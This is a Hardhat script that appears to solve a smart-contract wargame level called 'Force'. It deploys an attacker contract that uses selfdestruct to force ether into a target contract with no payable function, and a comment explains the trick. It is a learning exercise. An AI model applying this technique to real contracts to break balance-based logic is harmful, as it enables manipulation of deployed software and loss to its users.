import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { displayResult } from "../../utils/displayResult";
import { sendEther } from "../../utils/sendEther";

const targetAddress = "0x65D215a77896847D3D048d5f71D8fC603307A251";

async function main() {
  const [attacker] = await ethers.getSigners();

  const attackerContract = await deployContract("ForceAttacker", attacker, [
    targetAddress,
  ]);

  await sendEther(attacker, attackerContract.address, "0.000001");
  const tx = await attackerContract.attack();
  await tx.wait();
  const balance = await attacker.provider!.getBalance(targetAddress);
  displayResult(balance.gt(0));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
Even if the Force contract has got any payable function,
we can still send it ether using the selfdestruct function and specifying the 
address of the Force contract as the beneficiary. The EVM will force the 
transfer. It's a bit like a testament :').
*/
